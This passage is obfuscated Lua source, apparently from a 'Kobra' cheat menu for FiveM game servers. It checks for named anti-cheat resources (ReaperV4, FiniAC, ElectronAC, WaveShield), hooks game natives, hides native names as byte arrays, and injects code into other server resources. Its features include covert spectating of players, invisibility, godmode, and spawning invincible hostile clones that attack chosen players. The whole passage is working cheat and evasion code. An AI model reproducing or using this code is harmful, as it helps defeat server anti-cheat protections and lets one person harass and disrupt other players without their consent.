            ]],v212,v323));v213=v213 + (2 -1) ;end end v209:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v211,v213, #v210),6962 -(1300 + 662) );end;v12.HandleSpectateToggle=function(v214,v215,v216) if  not v215 then v214:Notify("error","Kobra","Invalid player ID provided!",9420 -6420 );return;end local v217=tonumber(v215);if  not v217 then v214:Notify("error","Kobra","Invalid server ID format!",3000);return;end if (v217==tonumber(GetPlayerServerId(PlayerId()))) then v214:Notify("error","Kobra","You cannot spectate yourself!",4755 -(1178 + 577) );return;end if v216 then v214:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v217)) or "Unknown" ,v217),3000);else v214:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v217)) or "Unknown" ,v217),1558 + 1442 );end local v218=GetResourceState("ReaperV4")=="started" ;if v218 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v217)) then v214:Notify("error","Kobra","Target player not found!",8868 -5868 );print("[ReaperV4 Spectate] Error: No player found for server ID:",v217);return;end local v526=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v216),v217);local v527,v528=load(v526);if v527 then local v685=0;local v686;local v687;while true do if (v685==0) then v686,v687=pcall(v527);if  not v686 then local v1106=1405 -(851 + 554) ;while true do if (v1106==(0 + 0)) then print("[ReaperV4 Spectate] Execution error:",v687);v214:Notify("error","Kobra","Failed to execute spectate code!",3000);break;end end else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else print("[ReaperV4 Spectate] Load error:",v528);v214:Notify("error","Kobra","Failed to load spectate code!",3000);end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v688=0;while true do if ((0 -0)==v688) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v216),v217));break;end end else print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v216),v217));end end;local v74={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v75() for v324,v325 in ipairs(v74) do if (GetResourceState(v325)=="started") then return v325;end end return nil;end local v76=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="core";end v12.EnableInvisibility=function(v219) local function v220(v326,v327) local v328=_G[v326];if ( not v328 or (type(v328)~="function")) then return;end _G[v326]=function(...) return v327(v328,...);end;end v220("CreateThread",function(v329,...) return v329(...);end);v220("PlayerPedId",function(v330,...) return v330(...);end);v220("IsEntityVisible",function(v331,...) return true;end);v220("IsEntityVisibleToScript",function(v332,...) return true;end);v220("SetEntityVisible",function(v333,v334,v335,v336) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v333(v334,false,v336);end return v333(v334,v335,v336);end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end if  not _G.osintInvisibility.enabled then _G.osintInvisibility.enabled=true;local v529=PlayerPedId();_G.osintInvisibility.wasVisible=IsEntityVisible(v529);SetEntityVisible(v529,false,false);CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v689=0 + 0 ;local v690;while true do if (v689==(0 -0)) then v690=PlayerPedId();if (v690 and DoesEntityExist(v690)) then SetEntityVisible(v690,false,false);end v689=359 -(237 + 121) ;end if (v689==(898 -(525 + 372))) then Wait(947 -447 );break;end end end end);end end;v12.DisableInvisibility=function(v221) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v530=0;local v531;while true do if (v530==1) then if (v531 and DoesEntityExist(v531)) then SetEntityVisible(v531,_G.osintInvisibility.wasVisible,false);end break;end if (v530==0) then _G.osintInvisibility.enabled=false;v531=PlayerPedId();v530=3 -2 ;end end end end;v12.HandleAttackClonePlayer=function(v222,v223) local v224=0;local v225;while true do if (v224==(143 -(96 + 46))) then MachoHookNative(2596915000000000000,function(v691) return true,v691;end);MachoHookNative(15321135000000000000 -(643 + 134) ,function(v692,v693,v694,v695,v696,v697,v698) return true,v692,v693,v694,v695,v696,v697,v698;end);v224=1 + 1 ;end if (v224==(4 -2)) then MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v225));break;end if (v224==(0 -0)) then if ( not v223 or ( #v223==(0 + 0))) then return;end v225=table.concat(v223,",");v224=1 -0 ;end end end;v12.HandleGodmodeToggle=function(v226,v227) local v228=GetResourceState("WaveShield")=="started" ;local v229=((GetResourceState("monitor")=="started") and "monitor") or (v228 and "WaveShield") or "any" ;if v228 then local v532=0;while true do if (v532==(0 -0)) then if v227 then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",3719 -(316 + 403) );v48(v229,[[
